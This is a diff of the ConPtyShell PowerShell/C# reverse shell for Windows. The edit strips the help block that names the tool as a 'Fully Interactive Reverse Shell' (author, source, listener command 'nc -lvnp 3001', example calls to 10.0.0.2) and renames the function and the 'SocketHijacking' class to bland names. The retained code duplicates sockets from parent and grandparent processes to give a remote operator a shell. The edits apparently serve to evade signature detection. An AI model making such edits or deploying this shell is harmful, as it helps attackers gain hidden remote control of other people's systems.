@@ -1,73 +1,5 @@
 function PtyS
 {   
-    <#
-        .SYNOPSIS
-            ConPtyShell - Fully Interactive Reverse Shell for Windows 
-            Author: splinter_code
-            License: MIT
-            Source: https://github.com/antonioCoco/ConPtyShell
-        
-        .DESCRIPTION
-            ConPtyShell - Fully interactive reverse shell for Windows
-            
-            Properly set the rows and cols values. You can retrieve it from
-            your terminal with the command "stty size".
-            
-            You can avoid to set rows and cols values if you run your listener
-            with the following command:
-                stty raw -echo; (stty size; cat) | nc -lvnp 3001
-           
-            If you want to change the console size directly from powershell
-            you can paste the following commands:
-                $width=80
-                $height=24
-                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
-                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
-            
-            
-        .PARAMETER RemoteIp
-            The remote ip to connect
-        .PARAMETER RemotePort
-            The remote port to connect
-        .PARAMETER Rows
-            Rows size for the console
-            Default: "24"
-        .PARAMETER Cols
-            Cols size for the console
-            Default: "80"
-        .PARAMETER CommandLine
-            The commandline of the process that you are going to interact
-            Default: "powershell.exe"
-            
-        .EXAMPLE  
-            PS>Invoke-ConPtyShell 10.0.0.2 3001
-            
-            Description
-            -----------
-            Spawn a reverse shell
-
-        .EXAMPLE
-            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
-            
-            Description
-            -----------
-            Spawn a reverse shell with specific rows and cols size
-            
-         .EXAMPLE
-            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
-            
-            Description
-            -----------
-            Spawn a reverse shell (cmd.exe) with specific rows and cols size
-            
-        .EXAMPLE
-            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
-            
-            Description
-            -----------
-            Upgrade your current shell with specific rows and cols size
-            
-    #>
     Param
     (
         [Parameter(Position = 0)]
@@ -157,7 +89,7 @@ public class DeadlockCheckHelper
     private uint ThreadCheckDeadlock(uint threadParams)
     {
         IntPtr objPtr = IntPtr.Zero;
-        objPtr = SocketHijacking.NtQueryObjectDynamic(this.targetHandle, SocketHijacking.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
+        objPtr = SocketHj.NtQueryObjectDynamic(this.targetHandle, SocketHj.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
         this.deadlockDetected = false;
         if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);
         return 0;
@@ -180,7 +112,7 @@ public class DeadlockCheckHelper
     }
 }
 
-public static class SocketHijacking
+public static class SocketHj
 {
 
     private const uint NTSTATUS_SUCCESS = 0x00000000;
@@ -1368,14 +1300,14 @@ public static class ConPtyShell
                 parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                 if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
                 // try to duplicate the socket for the current process
-                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess);
+                shellSocket = SocketHj.DuplicateTargetProcessSocket(currentProcess);
                 if (shellSocket == IntPtr.Zero && parentProcess != null) {
                     // if no sockets are found in the current process we try to hijack our current parent process socket
-                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess);
+                    shellSocket = SocketHj.DuplicateTargetProcessSocket(parentProcess);
                     if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                     {
                         // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
-                        shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess);
+                        shellSocket = SocketHj.DuplicateTargetProcessSocket(grandParentProcess);
                         if (shellSocket == IntPtr.Zero)
                         {
                             throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
@@ -1387,14 +1319,14 @@ public static class ConPtyShell
                     else {
                         // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                         parentSocketInherited = true;
-                        if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+                        if (grandParentProcess != null) grandParentSocketInherited = SocketHj.IsSocketInherited(shellSocket, grandParentProcess);
                     }
                 }
                 else
                 {
                     // the current process got a usable socket, let's see if the parents use the socket
-                    if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
-                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+                    if (parentProcess != null) parentSocketInherited = SocketHj.IsSocketInherited(shellSocket, parentProcess);
+                    if (grandParentProcess != null) grandParentSocketInherited = SocketHj.IsSocketInherited(shellSocket, grandParentProcess);
                 }
             }
             else
